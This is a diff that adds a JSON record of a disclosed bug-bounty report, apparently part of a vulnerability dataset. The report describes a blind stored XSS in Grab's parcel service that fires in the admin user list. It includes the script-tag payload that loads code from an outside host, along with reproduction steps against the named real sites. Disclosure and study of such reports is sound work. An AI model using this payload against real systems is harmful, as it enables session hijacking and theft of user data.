@@ -1,0 +1,45 @@
+{
+    "reported_to": "Grab",
+    "reported_by": "paresh_parmar ",
+    "title": "Blind stored xss [parcel.grab.com] > name parameter ",
+    "content": "\nHi,\nmy previously reported blind xss is fixed but i found same type of xss in diffrent area with more impact.\nSteps to repro:\ncreate new account with name \"><script src=https://x.com></script> here https://parcel.grab.com/\nafftected page is https://app.detrack.com/a/ where admin can see all the user's of application and this is one more impact full because it contains all the user's email address. attacker can hijack all the information from there using xss affeffcted page poc: {F204498\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\ngo here https://app.detrack.com/a/ and find \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 , that is my account with xss payload.\nthanks\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": 750,
+    "weaknesses": [
+        "Cross-site Scripting (XSS) - Stored"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1505403660,
+    "report_url": "https://hackerone.com/reports/251224",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Create a new account on https://parcel.grab.com/ with the name parameter set to a XSS payload: \"><script src=https://x.com></script>"
+        ],
+        [
+            2,
+            "Navigate to the admin panel at https://app.detrack.com/a/ where the XSS payload will execute when the admin views the user list, potentially exposing sensitive user data."
+        ]
+    ],
+    "vuln_description": "A blind stored XSS vulnerability exists in the 'name' parameter of the user account creation process on parcel.grab.com. This vulnerability allows an attacker to inject malicious JavaScript that executes when an administrator views the user list on app.detrack.com/a/, potentially leading to data theft or session hijacking.",
+    "reason": "The vulnerability involves a straightforward XSS injection in a user-controllable field that persists and executes in a different administrative context. While it requires understanding where the input is reflected, the attack itself is not complex and follows common XSS patterns.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "injection_metadata": {
+        "is_simple_payload": true
+    },
+    "authnz_metadata": {
+        "reason": "The reported blind stored XSS vulnerability involves injecting a script via the 'name' parameter during account creation, which is then reflected in an admin panel. This does not directly involve authentication or authorization bypass (AuthN/AuthZ) or insecure direct object references (IDOR). The methodology described focuses on testing AuthN/AuthZ and IDOR vulnerabilities by swapping user sessions and resource IDs, which is not applicable here as the vulnerability is a client-side injection issue.",
+        "is_detectable": false
+    }
+}
